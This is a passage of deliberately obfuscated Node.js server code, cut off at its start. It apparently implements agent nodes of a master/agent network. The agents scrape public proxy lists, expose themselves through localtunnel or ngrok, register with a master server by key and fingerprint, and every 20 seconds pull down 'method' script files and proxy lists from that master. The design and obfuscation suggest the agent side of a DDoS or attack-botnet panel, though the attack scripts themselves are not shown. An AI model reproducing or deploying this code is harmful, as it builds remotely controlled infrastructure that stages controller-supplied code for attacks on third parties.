_0xb46d70)=>{const _0x3a3600=_0x214aff,_0x412f76=path['join'](__dirname,'proxy.txt');if(!fs['existsSync'](_0x412f76))return _0xb46d70[_0x3a3600(0x23d)](0x194)[_0x3a3600(0x1b9)](_0x3a3600(0x9a));_0xb46d70[_0x3a3600(0x80)]('text/plain')[_0x3a3600(0x1b9)](fs[_0x3a3600(0x267)](_0x412f76,_0x3a3600(0xf0)));});async function scrapeProxy({protocols:protocols=['http',_0x214aff(0x13a),_0x214aff(0xd6),_0x214aff(0x272)],country:country='ALL'}){const _0x59d754=_0x214aff,_0x506034=[],_0x3ae560={'total':0x0,'byProto':{}};for(const _0xe7572 of SCRAPE_SOURCES){if(!protocols[_0x59d754(0x195)](_0xe7572[_0x59d754(0xb4)])&&_0xe7572[_0x59d754(0xb4)]!=='mix')continue;try{const {data:_0x43055a}=await axios[_0x59d754(0x228)](_0xe7572[_0x59d754(0xe5)],{'timeout':0x3a98}),_0x35b1af=_0x43055a['split']('\x0a')[_0x59d754(0x1a1)](_0xcd1f15=>parseProxyLine(_0xcd1f15))[_0x59d754(0x15d)](_0xd57cc4=>!!_0xd57cc4);for(const _0x94ef93 of _0x35b1af){_0x506034['push'](_0x94ef93);}_0x3ae560['total']+=_0x35b1af[_0x59d754(0x230)],_0x3ae560[_0x59d754(0x242)][_0xe7572['proto']]=(_0x3ae560['byProto'][_0xe7572[_0x59d754(0xb4)]]||0x0)+_0x35b1af[_0x59d754(0x230)];}catch(_0x1f6ac6){logActivity('SCRAPE_SOURCE_FAILED',{'url':_0xe7572[_0x59d754(0xe5)],'error':_0x1f6ac6[_0x59d754(0x139)]});}}return{'proxies':_0x506034,'stats':_0x3ae560};}async function getPublicIp(){const _0xabe979=_0x214aff;try{const {data:_0x5406ff}=await axios[_0xabe979(0x228)](_0xabe979(0x135),{'timeout':0x1388});return _0x5406ff['ip'];}catch(_0x76ebd3){return logActivity(_0xabe979(0x11b),{'error':_0x76ebd3[_0xabe979(0x139)]}),_0xabe979(0x83);}}async function autoRegisterToMaster(){const _0x1d7000=_0x214aff;if(NODE_TYPE!==_0x1d7000(0x269))return;let _0x217337=localTunnelUrl;if(!_0x217337){const _0x505f08=await getPublicIp();_0x217337=_0x1d7000(0xec)+_0x505f08+':'+port;}let _0x57d50f='',_0x2049e6=!![];try{const {data:_0x189649}=await axios['get'](MASTER_URL+_0x1d7000(0x1cf),{'params':{'key':AGENT_KEY},'timeout':0x3a98}),_0x281a55=_0x189649['find'](_0x593f67=>_0x593f67['fingerprint']===AGENT_FINGERPRINT);if(_0x281a55)_0x57d50f=_0x281a55[_0x1d7000(0x1c5)],_0x281a55[_0x1d7000(0xe5)]!==_0x217337&&(await axios['put'](MASTER_URL+_0x1d7000(0xea)+_0x57d50f,{'key':AGENT_KEY,'url':_0x217337},{'timeout':0x3a98}),logActivity(_0x1d7000(0x211),{'agentName':_0x57d50f,'oldUrl':_0x281a55[_0x1d7000(0xe5)],'newUrl':_0x217337})),_0x2049e6=![];else{const _0x4bfdcd=new Set(_0x189649['map'](_0x2ea5fd=>_0x2ea5fd[_0x1d7000(0x1c5)]));let _0x238e0e=0x1;while(_0x4bfdcd['has'](_0x1d7000(0x23e)+_0x238e0e))_0x238e0e++;_0x57d50f=_0x1d7000(0x23e)+_0x238e0e,_0x2049e6=!![];}}catch(_0x48ab5b){logActivity(_0x1d7000(0x168),{'error':_0x48ab5b[_0x1d7000(0x139)]}),_0x57d50f=LAST_REGISTERED['name']||_0x1d7000(0x177),_0x2049e6=!![];}if(_0x2049e6)try{const {data:_0x4efb9a}=await axios[_0x1d7000(0x1a3)](MASTER_URL+_0x1d7000(0x262),{'name':_0x57d50f,'url':_0x217337,'agentKey':AGENT_KEY,'fingerprint':AGENT_FINGERPRINT},{'timeout':0x3a98});logActivity(_0x1d7000(0x214),{'result':_0x4efb9a,'agentName':_0x57d50f,'agentUrl':_0x217337}),LAST_REGISTERED={'name':_0x57d50f,'url':_0x217337};}catch(_0xdc1675){logActivity('AUTO_REGISTER_MASTER_FAIL',{'error':_0xdc1675[_0x1d7000(0x139)],'agentName':_0x57d50f,'agentUrl':_0x217337});}}async function startNgrok(){const _0x3d0c16=_0x214aff;try{const _0x91a776=NGROK_TOKEN||process[_0x3d0c16(0x156)][_0x3d0c16(0x1d7)];if(_0x91a776)await ngrok[_0x3d0c16(0x155)](_0x91a776);const _0x240fdc=await ngrok[_0x3d0c16(0x86)]({'addr':port});console['log']('\x1b[32m%s\x1b[0m',_0x3d0c16(0xab),_0x240fdc),logActivity('NGROK_STARTED',{'url':_0x240fdc});}catch(_0x8aa414){console[_0x3d0c16(0x251)]('[MASTER]\x20Gagal\x20memulai\x20Ngrok:',_0x8aa414['message']),logActivity(_0x3d0c16(0x17a),{'error':_0x8aa414[_0x3d0c16(0x139)]});}}async function startLocalTunnel(_0x2d5547=0xa){const _0x349a6f=_0x214aff;let _0x8991b6=null;for(let _0x6c53c9=0x1;_0x6c53c9<=_0x2d5547;_0x6c53c9++){try{_0x8991b6=await localtunnel({'port':port});if(_0x8991b6[_0x349a6f(0xe5)])return localTunnelUrl=_0x8991b6['url'],console[_0x349a6f(0x1a0)](_0x349a6f(0x1ae),_0x349a6f(0x167),_0x8991b6[_0x349a6f(0xe5)]),_0x8991b6['on']('close',async()=>{const _0x282164=_0x349a6f;console['log'](_0x282164(0x119),_0x282164(0xbb)),logActivity('TUNNEL_CLOSED_AUTO',{'previousUrl':localTunnelUrl}),localTunnelUrl=null,currentTunnel=null,await new Promise(_0xf74fc3=>setTimeout(_0xf74fc3,0x5dc)),await restartTunnel();}),_0x8991b6;else throw new Error(_0x349a6f(0x188));}catch(_0x1ca0be){console[_0x349a6f(0x251)](_0x349a6f(0xf6)+_0x6c53c9+'):',_0x1ca0be[_0x349a6f(0x139)]),_0x6c53c9===_0x2d5547?console[_0x349a6f(0x251)](_0x349a6f(0x119),_0x349a6f(0x18c)):await new Promise(_0x2a953e=>setTimeout(_0x2a953e,0x3a98));}}return null;}async function checkTunnelHealth(){const _0x5ebe24=_0x214aff;if(!localTunnelUrl)return;try{const _0x577c4e=await axios['get'](localTunnelUrl,{'timeout':0x7530,'validateStatus':()=>!![]});_0x577c4e[_0x5ebe24(0x23d)]===0x1f7&&(console[_0x5ebe24(0x1a0)](_0x5ebe24(0x119),_0x5ebe24(0x26a)),logActivity('TUNNEL_503_DETECTED',{'url':localTunnelUrl}),await restartTunnel());}catch(_0x55feee){_0x55feee[_0x5ebe24(0x26f)]&&_0x55feee['response'][_0x5ebe24(0x23d)]===0x1f7&&(console[_0x5ebe24(0x1a0)](_0x5ebe24(0x119),_0x5ebe24(0x111)),logActivity(_0x5ebe24(0x224),{'url':localTunnelUrl}),await restartTunnel());}}async function restartTunnel(){const _0x5ad6b4=_0x214aff;try{if(currentTunnel&&typeof currentTunnel[_0x5ad6b4(0x19a)]===_0x5ad6b4(0x196))try{await currentTunnel[_0x5ad6b4(0x19a)]();}catch(_0x4cbcc0){console['warn'](_0x5ad6b4(0x162),_0x4cbcc0['message']),logActivity(_0x5ad6b4(0x1c8),{'error':_0x4cbcc0['message']});}currentTunnel=null,localTunnelUrl=null,await new Promise(_0x5b6fbc=>setTimeout(_0x5b6fbc,0x5dc)),currentTunnel=await startLocalTunnel(0xa);if(!currentTunnel||!currentTunnel[_0x5ad6b4(0xe5)]){console[_0x5ad6b4(0x251)](_0x5ad6b4(0x110)),logActivity(_0x5ad6b4(0x107),{'reason':_0x5ad6b4(0x12a)});return;}await autoRegisterToMaster(),logActivity('TUNNEL_RESTART_SUCCESS',{'newUrl':currentTunnel[_0x5ad6b4(0xe5)]}),console[_0x5ad6b4(0x1a0)](_0x5ad6b4(0xfa));}catch(_0x36c5f6){logActivity(_0x5ad6b4(0x246),{'error':_0x36c5f6[_0x5ad6b4(0x139)]}),console[_0x5ad6b4(0x251)]('[AGENT]\x20Gagal\x20restart\x20tunnel:',_0x36c5f6[_0x5ad6b4(0x139)]);}}setInterval(async()=>{const _0x2af9f3=_0x214aff;if(NODE_TYPE!==_0x2af9f3(0x269))return;if(currentTunnel||localTunnelUrl)return;console[_0x2af9f3(0x1a0)](_0x2af9f3(0x7f));try{currentTunnel=await startLocalTunnel(0xa),currentTunnel&&currentTunnel['url']?(console[_0x2af9f3(0x1a0)](_0x2af9f3(0x255),currentTunnel[_0x2af9f3(0xe5)]),await autoRegisterToMaster(),logActivity('TUNNEL_RECOVERY_SUCCESS',{'newUrl':currentTunnel[_0x2af9f3(0xe5)]})):logActivity('TUNNEL_RECOVERY_FAILED',{'reason':_0x2af9f3(0xdc)});}catch(_0x1ffe3e){console[_0x2af9f3(0x251)](_0x2af9f3(0x129),_0x1ffe3e[_0x2af9f3(0x139)]),logActivity('TUNNEL_RECOVERY_EXCEPTION',{'error':_0x1ffe3e[_0x2af9f3(0x139)]});}},0x7530);function _0x55b4(_0x401716,_0x1d6447){const _0x495867=_0x4958();return _0x55b4=function(_0x55b4a,_0x418b13){_0x55b4a=_0x55b4a-0x73;let _0x5d9dbc=_0x495867[_0x55b4a];return _0x5d9dbc;},_0x55b4(_0x401716,_0x1d6447);}async function autoSyncFromMaster(){const _0x9c86d6=_0x214aff;if(NODE_TYPE!==_0x9c86d6(0x269))return;try{const {data:_0x5008c1}=await axios['get'](MASTER_URL+'/api/methods',{'params':{'key':AGENT_KEY},'timeout':0x3a98});writeFileJsonSafe(methodsPath,_0x5008c1),logActivity(_0x9c86d6(0x104),{'from':MASTER_URL,'size':Object[_0x9c86d6(0x178)](_0x5008c1)[_0x9c86d6(0x230)]});const _0x43c844=new Set(Object['values'](_0x5008c1)[_0x9c86d6(0x1a1)](_0x32c607=>_0x32c607[_0x9c86d6(0x118)])[_0x9c86d6(0x15d)](Boolean));if(!fs[_0x9c86d6(0x18b)](uploadDir))fs['mkdirSync'](uploadDir,{'recursive':!![]});const _0x2dafa5=fs[_0x9c86d6(0x1f6)](uploadDir)['filter'](_0xe2414=>_0xe2414[_0x9c86d6(0xa9)]('.js')||_0xe2414['endsWith'](_0x9c86d6(0xb1)));for(const _0x4c7820 of _0x2dafa5){if(!_0x43c844[_0x9c86d6(0x24e)](_0x4c7820))try{fs['unlinkSync'](path[_0x9c86d6(0x84)](uploadDir,_0x4c7820)),logActivity(_0x9c86d6(0x13f),{'file':_0x4c7820});}catch(_0x32b54f){logActivity('AUTO_MIRROR_REMOVE_FAIL',{'file':_0x4c7820,'error':_0x32b54f[_0x9c86d6(0x139)]});}}for(const _0x170ab0 of _0x43c844){const _0x546d1b=path[_0x9c86d6(0x84)](uploadDir,_0x170ab0);if(!fs['existsSync'](_0x546d1b))try{const _0x2ce5b5=MASTER_URL+_0x9c86d6(0xf1)+encodeURIComponent(_0x170ab0),_0x336c30=await axios[_0x9c86d6(0x228)](_0x2ce5b5,{'responseType':_0x9c86d6(0x19d),'timeout':0x3a98}),_0x7b6758=fs[_0x9c86d6(0x12d)](_0x546d1b);await new Promise((_0x4d53d7,_0x2db227)=>{const _0x2b32dc=_0x9c86d6;_0x336c30[_0x2b32dc(0x95)][_0x2b32dc(0x216)](_0x7b6758),_0x7b6758['on']('finish',_0x4d53d7),_0x7b6758['on'](_0x2b32dc(0x251),_0x2db227);}),logActivity(_0x9c86d6(0x264),{'scriptName':_0x170ab0});}catch(_0xddc251){logActivity('AUTO_SYNC_METHOD_FILE_FAIL',{'scriptName':_0x170ab0,'error':_0xddc251[_0x9c86d6(0x139)]});}}try{const _0x49c1ab=MASTER_URL+'/proxy.txt',_0x29ac58=path[_0x9c86d6(0x84)](__dirname,_0x9c86d6(0x16c)),_0x327542=await axios[_0x9c86d6(0x228)](_0x49c1ab,{'responseType':_0x9c86d6(0x19d),'timeout':0x3a98}),_0x2f4a76=fs[_0x9c86d6(0x12d)](_0x29ac58);await new Promise((_0x25c5f4,_0x32fd47)=>{const _0x44a1b3=_0x9c86d6;_0x327542[_0x44a1b3(0x95)][_0x44a1b3(0x216)](_0x2f4a76),_0x2f4a76['on'](_0x44a1b3(0x87),_0x25c5f4),_0x2f4a76['on'](_0x44a1b3(0x251),_0x32fd47);}),logActivity(_0x9c86d6(0x7e),{'from':MASTER_URL});}catch(_0x273646){logActivity(_0x9c86d6(0x1e2),{'from':MASTER_URL,'error':_0x273646[_0x9c86d6(0x139)]});}}catch(_0x35757e){logActivity(_0x9c86d6(0x225),{'from':MASTER_URL,'error':_0x35757e[_0x9c86d6(0x139)]});}}NODE_TYPE==='agent'&&async function initAgent(){currentTunnel=await startLocalTunnel(0xa),await autoRegisterToMaster(),setInterval(autoRegisterToMaster,0x1e*0x3e8),autoSyncFromMaster(),setInterval(autoSyncFromMaster,0x14*0x3e8);let _0x30cadc=null;setInterval(()=>{const _0x270ab1=_0x55b4;localTunnelUrl&&localTunnelUrl!==_0x30cadc&&(logActivity(_0x270ab1(0x1ca),{'oldUrl':_0x30cadc,'newUrl':localTunnelUrl}),_0x30cadc=localTunnelUrl,autoRegisterToMaster());},0x3a98),setInterval(checkTunnelHealth,0x7530);}();NODE_TYPE===_0x214aff(0x21e)&&startNgrok();app[_0x214aff(0x90)]((_0x305430,_0x363261,_0x5b9521,_0x25a5cb)=>{const _0x50cd5d=_0x214aff;if(_0x305430 instanceof multer[_0x50cd5d(0x9e)])switch(_0x305430[_0x50cd5d(0x1d2)]){case _0x50cd5d(0x137):return _0x5b9521[_0x50cd5d(0x23d)](0x19d)[_0x50cd5d(0x207)]({'error':_0x50cd5d(0x24f)});case _0x50cd5d(0x8f):return _0x5b9521[_0x50cd5d(0x23d)](0x190)['json']({'error':_0x50cd5d(0x10f)});default:return _0x5b9521[_0x50cd5d(0x23d)](0x190)[_0x50cd5d(0x207)]({'error':_0x50cd5d(0x271)+_0x305430[_0x50cd5d(0x139)]});}if(_0x305430 instanceof SyntaxError&&_0x305430[_0x50cd5d(0x23d)]===0x190&&_0x50cd5d(0x1f9)in _0x305430)return _0x5b9521[_0x50cd5d(0x23d)](0x190)[_0x50cd5d(0x207)]({'error':_0x50cd5d(0x24b)});if(_0x305430&&_0x305430[_0x50cd5d(0x139)])return console[_0x50cd5d(0x251)](_0x50cd5d(0x115),_0x305430[_0x50cd5d(0x114)]||_0x305430),_0x5b9521['status'](0x190)[_0x50cd5d(0x207)]({'error':_0x305430[_0x50cd5d(0x139)]});if(_0x305430)return console[_0x50cd5d(0x251)](_0x50cd5d(0xb2),_0x305430[_0x50cd5d(0x114)]||_0x305430),_0x5b9521[_0x50cd5d(0x23d)](0x1f4)[_0x50cd5d(0x207)]({'error':_0x50cd5d(0x1c9)});_0x25a5cb();}),((async()=>{const _0x52af1b=_0x214aff;await fetchConfig(),httpServer[_0x52af1b(0x15e)](port,async()=>{const _0x472f42=_0x52af1b;console[_0x472f42(0x15c)]();let _0x142b47=_0x472f42(0x83);try{_0x142b47=execSync(_0x472f42(0x1c4))['toString']()['trim']();}catch(_0x159b08){}console[_0x472f42(0x1a0)](_0x472f42(0x8d)+_0x142b47+':'+port+':'+apiKey),logActivity('SERVER_START',{'ip':_0x142b47,'port':port,'nodeType':NODE_TYPE});});})()),process['on']('SIGINT',()=>{const _0x35103a=_0x214aff;logActivity(_0x35103a(0x18f),{'msg':_0x35103a(0x1c3)}),process[_0x35103a(0x193)]();});